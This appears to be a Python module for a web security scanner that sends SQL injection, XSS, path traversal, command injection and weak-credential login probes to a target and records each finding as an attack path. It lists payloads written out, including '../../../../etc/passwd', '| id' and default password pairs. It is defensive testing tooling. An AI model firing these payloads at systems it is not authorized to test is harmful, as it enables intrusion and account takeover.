"""Ethical Hacking Simulation Engine.

Runs CONTROLLED, non-destructive attack simulations against authorized
targets (the user-supplied target / bundled demo app):

- SQL injection (error-based + differential/blind detection)
- Cross-site scripting (reflected payload detection)
- Authentication attacks (weak credentials, predictable tokens, auth bypass)
- Open endpoint discovery (missing authorization)
- Path traversal / command injection probes (non-destructive)
- Passive security-header analysis

Every attack records a step-by-step attack path for replay mode.
"""
import json
import random
import re

from config import Config, SECURITY_HEADERS_REQUIRED
from .scanner import Endpoint, http, _try_json  # noqa: F401  (re-exported helpers)

import requests

# --------------------------------------------------------------- payloads --
SQLI_PAYLOADS = [
    ("classic OR", "' OR '1'='1' --"),
    ("numeric OR", "1 OR 1=1"),
    ("UNION probe", "' UNION SELECT NULL, NULL, NULL --"),
    ("stacked", "'; SELECT 1 --"),
    ("error-based", "' AND 1=(SELECT 1 FROM sqlite_master) --"),
]

XSS_PAYLOADS = [
    ("script tag", "<script>alert('sentinel')</script>"),
    ("img onerror", "<img src=x onerror=alert(1)>"),
    ("svg onload", "<svg onload=alert(1)>"),
    ("event handler", "\" onmouseover=alert(1) x=\""),
]

TRAVERSAL_PAYLOADS = [
    ("dot-dot", "../../../../etc/passwd"),
    ("encoded", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("windows", "..\\..\\..\\windows\\win.ini"),
]

CMDI_PAYLOADS = [
    ("pipe", "| id"),
    ("semicolon", "; id"),
    ("subshell", "$(whoami)"),
]

SQL_ERROR_MARKERS = [
    "sqlite3.operationalerror", "you have an error in your sql syntax",
    "unclosed quotation mark", "odbc", "psql: error", "pg_query",
    "mysql_fetch", "warning: mysql", "unterminated quoted string",
    "syntax error",
]

WEAK_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "password123"),
    ("root", "root"), ("test", "test"), ("user", "123456"),
]

STACK_MARKER = "Traceback (most recent call last)"


class AttackResult:
    """One simulated attack with full replay metadata."""

    def __init__(self, category, payload_label, payload, request, response,
                 success, evidence, steps, impact=""):
        self.category = category
        self.payload_label = payload_label
        self.payload = payload
        self.request = request          # dict {method,url,params/body}
        self.response = response        # dict from scanner.http
        self.success = success
        self.evidence = evidence
        self.steps = steps              # attack path steps
        self.impact = impact

    def to_dict(self):
        return self.__dict__


# ------------------------------------------------------------ utilities ----
def _full_url(base_url, ep):
    return base_url.rstrip("/") + ep.path


def _target_params(ep):
    """All parameters an endpoint accepts (spec params or common guesses)."""
    names = list(ep.params.keys())
    if not names:
        names = ["q", "search", "name", "id", "username", "input", "text"]
    return names


# ------------------------------------------------------------- SQLi attack --
def attack_sqli(base_url, ep, baseline=None):
    url = _full_url(base_url, ep)
    results = []
    for pname in _target_params(ep)[:3]:
        # per-parameter benign baseline for differential (blind) detection
        benign = http("GET", url, params={pname: "sentinel-probe"})
        benign_body = benign.get("body") or ""
        benign_status = benign.get("status")
        benign_len = len(benign_body)

        for label, payload in SQLI_PAYLOADS:
            req = {"method": "GET", "url": url, "params": {pname: payload}}
            res = http("GET", url, params={pname: payload})
            body = (res.get("body") or "")
            steps = [
                {"step": 1, "title": "Reconnaissance",
                 "detail": f"Identified parameter '{pname}' on {ep.path} as injection candidate."},
                {"step": 2, "title": "Baseline measurement",
                 "detail": f"Benign request returned HTTP {benign_status}, body length {benign_len}.",
                 "request": {"method": "GET", "url": url, "params": {pname: "sentinel-probe"}}},
                {"step": 3, "title": "Payload injection",
                 "detail": f"Sent payload: {payload!r}", "request": req},
                {"step": 4, "title": "Observe response",
                 "detail": f"Server responded with HTTP {res['status']} in {res['latency_ms']}ms, body length {len(body)}."},
            ]
            success, evidence = False, ""
            low = body.lower()
            if any(m in low for m in SQL_ERROR_MARKERS):
                success = True
                evidence = "Database error message leaked in response (error-based SQLi)."
                steps.append({"step": 5, "title": "Exploit confirmed",
                              "detail": "Server leaked a SQL error, proving the payload reached the query parser."})
            elif label in ("classic OR", "numeric OR"):
                # differential (blind): tautology must NOT change a parameterized query
                if benign_body and abs(len(body) - benign_len) / max(benign_len, 1) > 0.35:
                    success = True
                    evidence = "Blind (differential) SQLi: tautology payload drastically changed the result set."
                    steps.append({"step": 5, "title": "Exploit confirmed",
                                  "detail": "Response differs drastically from the benign baseline - the injected condition altered the SQL query."})
                elif not benign_body and len(body) > 40:
                    success = True
                    evidence = "Blind (differential) SQLi: injection produced data where the benign probe produced none."
                    steps.append({"step": 5, "title": "Exploit confirmed",
                                  "detail": "Benign probe returned an empty body, payload returned data."})
            elif benign_status == 200 and res.get("status") == 500:
                success = True
                evidence = "Error-based SQLi: crafted payload crashed the query (HTTP 500) while benign input succeeds (HTTP 200)."
                steps.append({"step": 5, "title": "Exploit confirmed",
                              "detail": "Payload reached the SQL parser and broke the query - input is concatenated into SQL."})
            if success:
                steps.append({"step": len(steps) + 1, "title": "Impact",
                              "detail": "Attacker can read/modify the database, bypass auth, or pivot deeper."})
                results.append(AttackResult(
                    "sqli", label, payload, req, res, True, evidence, steps,
                    "Full database disclosure, authentication bypass, data manipulation.",
                ))
                return results  # one confirmed exploit per endpoint is enough
    return results


# ------------------------------------------------------------- XSS attack --
def attack_xss(base_url, ep, baseline=None):
    url = _full_url(base_url, ep)
    results = []
    for pname in _target_params(ep)[:3]:
        for label, payload in XSS_PAYLOADS:
            req = {"method": "GET", "url": url, "params": {pname: payload}}
            res = http("GET", url, params={pname: payload})
            body = res.get("body") or ""
            steps = [
                {"step": 1, "title": "Reconnaissance",
                 "detail": f"Parameter '{pname}' on {ep.path} reflects input."},
                {"step": 2, "title": "Payload injection",
                 "detail": f"Sent payload: {payload!r}", "request": req},
                {"step": 3, "title": "Observe response",
                 "detail": f"HTTP {res['status']}, checking if payload is reflected unescaped..."},
            ]
            reflected_raw = payload in body
            if reflected_raw:
                success = True
                evidence = f"Payload reflected verbatim (unencoded) in response: {payload!r}"
                steps.append({"step": 4, "title": "Exploit confirmed",
                              "detail": "The raw script payload appears in the response body without HTML encoding - a browser will execute it."})
                steps.append({"step": 5, "title": "Impact",
                              "detail": "Session theft, credential harvesting, defacement, and malware delivery to other users (stored/reflected XSS)."})
                results.append(AttackResult(
                    "xss", label, payload, req, res, True, evidence, steps,
                    "JavaScript execution in victims' browsers: session/cookie theft, phishing overlays.",
                ))
                return results
    return results


# --------------------------------------------------- authentication attack --
def attack_auth(base_url, endpoints):
    """Try weak credentials on any login-like endpoint; test token handling."""
    results = []
    login_eps = [e for e in endpoints if any(
        k in e.path.lower() for k in ("login", "auth", "signin", "session"))]

    for ep in login_eps:
        url = _full_url(base_url, ep)
        for user, pwd in WEAK_CREDENTIALS:
            body = {"username": user, "password": pwd}
            req = {"method": "POST", "url": url, "json_body": body}
            res = http("POST", url, json=body, headers={"Content-Type": "application/json"})
            ok = res["status"] in (200, 201)
            data = res.get("json") if isinstance(res.get("json"), dict) else {}
            token = data.get("token") or data.get("access_token") or ""
            steps = [
                {"step": 1, "title": "Reconnaissance",
                 "detail": f"Found authentication endpoint {ep.path}."},
                {"step": 2, "title": "Credential stuffing",
                 "detail": f"Attempted common credential pair {user}/{pwd}", "request": req},
                {"step": 3, "title": "Observe response",
                 "detail": f"HTTP {res['status']} - login {'ACCEPTED' if ok else 'rejected'}."},
            ]
            if ok:
                evidence = f"Authentication succeeded with default/weak credentials: {user}/{pwd}"
                if isinstance(token, str) and re.fullmatch(r"[a-z0-9\-]{4,32}", token or ""):
                    evidence += f". Token '{token}' is predictable/static (no per-session randomness)."
                steps.append({"step": 4, "title": "Exploit confirmed",
                              "detail": "Weak or default credentials grant full authenticated access."})
                steps.append({"step": 5, "title": "Impact",
                              "detail": "Complete account takeover with no brute-force required."})
                results.append(AttackResult(
                    "broken_auth", f"weak-creds:{user}", f"{user}/{pwd}", req, res,
                    True, evidence, steps,
                    "Full unauthorized access to authenticated functionality and user data.",
                ))
                # token predictability as separate signal
                if isinstance(token, str) and re.fullmatch(r"[a-z0-9\-]{4,32}", token or ""):
                    steps2 = [
                        {"step": 1, "title": "Token analysis",
                         "detail": f"Issued token '{token}' after login."},
                        {"step": 2, "title": "Pattern detection",
                         "detail": "Token matches a short, predictable pattern (no JWT, no entropy)."},
                        {"step": 3, "title": "Exploit confirmed",
                         "detail": "Token can be guessed or reused across sessions - session fixation/impersonation possible."},
                    ]
                    results.append(AttackResult(
                        "broken_auth", "predictable-token", token, req, res, True,
                        f"Session token '{token}' is static/predictable.",
                        steps2, "Session hijacking and user impersonation.",
                    ))
                break
    return results


def attack_open_endpoints(base_url, endpoints, auth_hint=None):
    """Access endpoints with NO credentials to find missing authorization."""
    results = []
    protected = [e for e in endpoints if any(
        k in e.path.lower() for k in ("admin", "secret", "internal", "private", "config", "debug"))]
    for ep in protected:
        url = _full_url(base_url, ep)
        req = {"method": "GET", "url": url, "headers": {}}
        res = http("GET", url)  # completely unauthenticated
        steps = [
            {"step": 1, "title": "Reconnaissance",
             "detail": f"Endpoint {ep.path} looks privileged (name-based heuristics)."},
            {"step": 2, "title": "Unauthenticated access",
             "detail": "Sent plain GET with no Authorization header.", "request": req},
            {"step": 3, "title": "Observe response",
             "detail": f"HTTP {res['status']} without any credentials."},
        ]
        if res["status"] == 200:
            body = res.get("body") or ""
            steps.append({"step": 4, "title": "Exploit confirmed",
                         "detail": "Server returned sensitive content to an anonymous caller."})
            steps.append({"step": 5, "title": "Impact",
                         "detail": "Any internet user can read privileged data or trigger privileged actions."})
            results.append(AttackResult(
                "open_endpoint", "no-auth", "(no credentials)", req, res, True,
                f"Endpoint {ep.path} returned HTTP 200 with sensitive content ({body[:80]!r}...) without authentication.",
                steps, "Unauthorized access to administrative data/functions.",
            ))
    return results


# ------------------------------------------------- traversal / command inj --
def attack_traversal(base_url, ep):
    url = _full_url(base_url, ep)
    results = []
    for pname in _target_params(ep)[:2]:
        for label, payload in TRAVERSAL_PAYLOADS:
            req = {"method": "GET", "url": url, "params": {pname: payload}}
            res = http("GET", url, params={pname: payload})
            body = res.get("body") or ""
            steps = [
                {"step": 1, "title": "Reconnaissance",
                 "detail": f"Parameter '{pname}' on {ep.path} may be used in file operations."},
                {"step": 2, "title": "Payload injection",
                 "detail": f"Sent traversal payload: {payload!r}", "request": req},
                {"step": 3, "title": "Observe response",
                 "detail": f"HTTP {res['status']} - checking for file-content signatures."},
            ]
            if "root:x:0:0" in body or "[fonts]" in body.lower():
                steps.append({"step": 4, "title": "Exploit confirmed",
                             "detail": "Contents of a system file appeared in the response."})
                results.append(AttackResult(
                    "path_traversal", label, payload, req, res, True,
                    "System file contents readable via path traversal.",
                    steps, "Arbitrary file read: config/secrets/key exfiltration.",
                ))
                return results
    return results


def attack_cmd_injection(base_url, ep):
    url = _full_url(base_url, ep)
    results = []
    for pname in _target_params(ep)[:2]:
        for label, payload in CMDI_PAYLOADS:
            req = {"method": "GET", "url": url, "params": {pname: payload}}
            res = http("GET", url, params={pname: payload})
            body = res.get("body") or ""
            steps = [
                {"step": 1, "title": "Reconnaissance",
                 "detail": f"Parameter '{pname}' may be passed to a shell command."},
                {"step": 2, "title": "Payload injection",
                 "detail": f"Sent command-injection probe: {payload!r}", "request": req},
                {"step": 3, "title": "Observe response",
                 "detail": f"HTTP {res['status']} - checking for command output."},
            ]
            if re.search(r"uid=\d+\([a-z-]+\)", body):
                steps.append({"step": 4, "title": "Exploit confirmed",
                              "detail": "Command output (`id`/`whoami`) visible in the response."})
                results.append(AttackResult(
                    "command_injection", label, payload, req, res, True,
                    "Shell command output reflected: server executes attacker-supplied commands.",
                    steps, "Remote code execution: full server compromise.",
                ))
                return results
    return results


# ----------------------------------------------------------- passive checks --
def check_security_headers(base_url, endpoints):
    """Analyze responses for missing security headers."""
    results, seen = [], set()
    for ep in endpoints[:6]:
        url = _full_url(base_url, ep)
        res = http("GET", url)
        hdrs = {k.lower(): v for k, v in res.get("headers", {}).items()}
        missing = [h for h in SECURITY_HEADERS_REQUIRED
                   if h.lower() not in hdrs]
        # dedupe on the same missing set
        key = tuple(sorted(missing))
        if not missing or key in seen:
            continue
        seen.add(key)
        results.append(AttackResult(
            "missing_headers", "header-audit", ", ".join(missing),
            {"method": "GET", "url": url}, res, True,
            f"Missing security headers: {', '.join(missing)}",
            [
                {"step": 1, "title": "Passive audit",
                 "detail": f"Fetched {ep.path} and compared response headers against OWASP secure-header baseline."},
                {"step": 2, "title": "Findings",
                 "detail": f"Absent: {', '.join(missing)}."},
                {"step": 3, "title": "Impact",
                 "detail": "Enables clickjacking, MIME-sniffing, protocol downgrade and data-URI injection attacks."},
            ],
            "Increased exposure to client-side and MITM attack classes.",
        ))
    return results


def check_data_leakage(base_url, endpoints):
    """Look for sensitive fields exposed in ordinary API responses."""
    sensitive_fields = ["password", "password_hash", "secret", "api_key", "token", "ssn", "credit_card"]
    results = []
    for ep in endpoints[:10]:
        url = _full_url(base_url, ep)
        res = http("GET", url)
        body = res.get("body") or ""
        try:
            data = json.loads(body) if body else None
        except ValueError:
            data = None
        if not isinstance(data, (dict, list)):
            continue
        flattened = json.dumps(data).lower()
        leaked = [f for f in sensitive_fields if f'"{f}"' in flattened]
        if leaked:
            results.append(AttackResult(
                "data_leakage", "field-audit", ", ".join(leaked),
                {"method": "GET", "url": url}, res, True,
                f"Sensitive fields exposed in response: {', '.join(leaked)}",
                [
                    {"step": 1, "title": "Passive audit",
                     "detail": f"Inspected JSON response of {ep.path}."},
                    {"step": 2, "title": "Sensitive data found",
                     "detail": f"Ordinary (unauthenticated) response contains: {', '.join(leaked)}."},
                    {"step": 3, "title": "Impact",
                     "detail": "Credential material/secrets shipped to every caller - direct account compromise."},
                ],
                "Credential or secret exposure leading to account takeovers.",
            ))
            break
    return results


def check_verbose_errors(base_url, endpoints):
    """Detect stack traces / internal details in responses."""
    results = []
    for ep in endpoints:
        url = _full_url(base_url, ep)
        if not any(k in ep.path.lower() for k in ("error", "debug", "fail", "crash")):
            continue
        res = http("GET", url)
        if STACK_MARKER in (res.get("body") or ""):
            results.append(AttackResult(
                "verbose_error", "error-probe", "GET " + ep.path,
                {"method": "GET", "url": url}, res, True,
                "Stack trace with internal paths/framework details returned to the client.",
                [
                    {"step": 1, "title": "Reconnaissance",
                     "detail": f"Probed error-raising endpoint {ep.path}."},
                    {"step": 2, "title": "Trigger error", "request": {"method": "GET", "url": url},
                     "detail": "Requested the endpoint to trigger an exception."},
                    {"step": 3, "title": "Exploit confirmed",
                     "detail": "Full Python traceback disclosed: framework, file paths, and query logic revealed."},
                    {"step": 4, "title": "Impact",
                     "detail": "Massively assists attackers in crafting targeted exploits."},
                ],
                "Information disclosure that accelerates further attacks.",
            ))
    return results


# ------------------------------------------------------------- validation ---
def check_improper_validation(base_url, endpoints, baseline=None):
    """Detect endpoints accepting clearly invalid input without rejecting it."""
    results = []
    for ep in endpoints[:8]:
        url = _full_url(base_url, ep)
        for pname in _target_params(ep)[:2]:
            bad = {"__proto__": "x", "id": {"$ne": None}, "n": ("A" * 100000)}
            payload = bad.get(pname, {"nested": {"deep": "object"}})
            try:
                payload = json.dumps(payload)
            except TypeError:
                continue
            res = http("GET", url, params={pname: payload})
            if res["status"] in (200, 201):
                results.append(AttackResult(
                    "improper_validation", "type-confusion", f"{pname}=<serialized object>",
                    {"method": "GET", "url": url, "params": {pname: payload}}, res, True,
                    f"Endpoint accepted serialized object/NoSQL operator in parameter '{pname}' without validation (HTTP 200).",
                    [
                        {"step": 1, "title": "Probe",
                         "detail": f"Injected object-shaped data into '{pname}'."},
                        {"step": 2, "title": "Observe response",
                         "detail": "Server returned 200 - input not type-validated."},
                        {"step": 3, "title": "Impact",
                         "detail": "Type confusion / NoSQL operator injection / memory abuse become possible."},
                    ],
                    "Unexpected input classes reach business logic unvalidated.",
                ))
                break
    return results


# ------------------------------------------------------------ orchestrator -
def run_all_attacks(base_url, endpoints, baselines=None, progress_cb=None):
    """Run the full controlled attack suite. Returns list[AttackResult]."""
    baselines = baselines or {}
    attacks = []

    def baseline_for(ep):
        key = ("GET", base_url.rstrip("/") + ep.path)
        return baselines.get(key)

    suites = []
    for ep in endpoints:
        suites.append(("SQL injection", lambda e=ep: attack_sqli(base_url, e, baseline_for(e))))
        suites.append(("XSS", lambda e=ep: attack_xss(base_url, e)))
        suites.append(("Path traversal", lambda e=ep: attack_traversal(base_url, e)))
        suites.append(("Command injection", lambda e=ep: attack_cmd_injection(base_url, e)))
    suites.append(("Authentication", lambda: attack_auth(base_url, endpoints)))
    suites.append(("Open endpoints", lambda: attack_open_endpoints(base_url, endpoints)))
    suites.append(("Security headers", lambda: check_security_headers(base_url, endpoints)))
    suites.append(("Data leakage", lambda: check_data_leakage(base_url, endpoints)))
    suites.append(("Verbose errors", lambda: check_verbose_errors(base_url, endpoints)))
    suites.append(("Validation", lambda: check_improper_validation(base_url, endpoints)))

    for i, (name, fn) in enumerate(suites):
        if progress_cb:
            progress_cb(int(i / len(suites) * 100), name)
        try:
            attacks.extend(fn())
        except Exception as exc:  # keep the sweep alive on a single suite error
            attacks.append(AttackResult(
                "engine_error", name, "-", {}, {"status": 0}, False,
                f"Attack suite '{name}' crashed: {exc}", [], ""
            ))
    return attacks
